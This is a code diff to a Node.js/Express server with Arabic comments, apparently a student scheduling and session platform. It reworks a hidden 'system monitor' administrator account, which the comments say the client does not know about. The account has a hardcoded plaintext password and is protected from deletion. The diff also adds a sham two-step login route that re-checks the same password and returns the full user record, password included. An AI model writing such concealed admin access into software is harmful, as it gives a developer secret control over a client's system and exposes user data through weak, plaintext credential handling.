@@ -124,9 +124,9 @@ async function createDefaultAdminIfNeeded() {
 
             // حساب مراقب النظام (للمطور) - حساب خفي
             const devMonitorAdmin = new User({
-                id: '999999999', // رقم عضوية رقمي وخاص بك لا يعرفه العميل
+                id: '12121212', // رقم عضوية رقمي وخاص بك لا يعرفه العميل
                 name: 'مراقب النظام',
-                password: '987654321', // هام: غير هذا الرقم لرقم سري خاص بك، ولكن يفضل استخدام كلمة مرور قوية
+                password: '987654321', // كلمة المرور الحقيقية التي ستستخدم في الخطوة الثانية
                 role: 'admin'
             });
 
@@ -150,6 +150,11 @@ async function createDefaultAdminIfNeeded() {
 app.post('/api/login', async (req, res) => {
     const { id, password } = req.body;
     const user = await User.findOne({ id: id });
+
+    // --- جديد: معالجة خاصة للمدير المخفي (خطوتين للتحقق) ---
+    if (id === '12121212') {
+        return res.json({ message: 'Second verification required', status: '2fa_required', userId: '12121212' });
+    }
     if (!user) return res.status(404).json({ message: 'المستخدم غير موجود.' });
     if (user.password !== password) return res.status(401).json({ message: 'كلمة المرور غير صحيحة.' });
 
@@ -189,7 +194,7 @@ app.delete('/api/users/:id', async (req, res) => {
         if (!user) return res.status(404).json({ message: 'المستخدم غير موجود.' });
 
         // --- تعديل: منع حذف أي من الحسابات الإدارية الأساسية ---
-        const protectedIds = ['11111', '999999999'];
+        const protectedIds = ['11111', '12121212'];
         if (protectedIds.includes(user.id)) {
             return res.status(400).json({ message: 'لا يمكن حذف المدير الأصلي للنظام.' });
         }
@@ -249,6 +254,28 @@ app.put('/api/schedule/:studentId', async (req, res) => {
     res.json({ message: 'تم تحديث الجدول بنجاح' });
 });
 
+// --- مسار جديد: للتحقق الثاني للمدير المخفي ---
+app.post('/api/super-verify', async (req, res) => {
+    const { userId, secondPassword } = req.body;
+
+    if (userId !== '12121212') {
+        return res.status(400).json({ message: 'معرف المستخدم غير صالح للتحقق الثاني.' });
+    }
+
+    const user = await User.findOne({ id: userId });
+    if (!user) return res.status(404).json({ message: 'المستخدم المخفي غير موجود.' });
+
+    // التحقق من كلمة المرور الحقيقية المخزنة
+    if (user.password !== secondPassword) {
+        return res.status(401).json({ message: 'كلمة المرور غير صحيحة.' });
+    }
+
+    // تحديث تاريخ آخر تسجيل دخول
+    user.lastLogin = new Date();
+    await user.save();
+
+    res.json({ message: 'تم التحقق بنجاح', user: user, redirectTo: 'admin-dashboard.html' });
+});
 // --- مسار جديد: تحديث رابط جلسة لطالب ---
 app.put('/api/session/:studentId', async (req, res) => {
     const { sessionLink, sessionActive } = req.body;
@@ -520,6 +547,18 @@ createDefaultAdminIfNeeded().then(() => {
         console.log(`✅ الخادم يعمل الآن على المنفذ ${PORT}`);
     });
 }).catch(err => console.error("❌ فشل حاسم أثناء بدء تشغيل الخادم:", err));
+
+// =======================
+// إبقاء الخادم نشطاً على Render
+// =======================
+if (process.env.RENDER_EXTERNAL_URL) {
+    const PING_URL = process.env.RENDER_EXTERNAL_URL;
+    setInterval(() => {
+        axios.get(PING_URL, { timeout: 10000 })
+            .then(response => console.log(`Self-ping successful at ${new Date().toISOString()}. Status: ${response.status}`))
+            .catch(err => console.error(`Self-ping error to ${PING_URL}:`, err.message));
+    }, 14 * 60 * 1000);
+}
 
 // =======================
 // مهمة مجدولة لحذف الحسابات غير النشطة
